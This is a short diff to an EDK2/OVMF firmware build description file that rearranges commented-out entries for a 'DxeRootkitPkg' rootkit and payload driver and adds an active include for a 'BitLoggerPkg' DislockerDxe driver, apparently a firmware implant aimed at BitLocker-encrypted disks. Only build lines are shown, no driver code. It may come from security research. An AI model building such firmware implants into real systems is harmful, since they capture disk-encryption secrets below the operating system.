@@ -405,11 +405,13 @@ INF  MdeModulePkg/Universal/Variable/RuntimeDxe/VariableRuntimeDxe.inf
 #
 !include OvmfPkg/OvmfTpmDxe.fdf.inc
 
-# INF  DxeRootkitPkg/RootkitDxe/Rootkit.inf
-# INF  DxeRootkitPkg/PayloadDxe/Payload.inf
 INF  uefi-driver/uefi_driver.inf
 
+# INF  DxeRootkitPkg/RootkitDxe/Rootkit.inf
+# INF  DxeRootkitPkg/PayloadDxe/Payload.inf
+
 # INF  BitLoggerPkg/BitLoggerDxe/BitLoggerDxe.inf
+ INF  BitLoggerPkg/DislockerDxe/DislockerDxe.inf
 
 ################################################################################
 
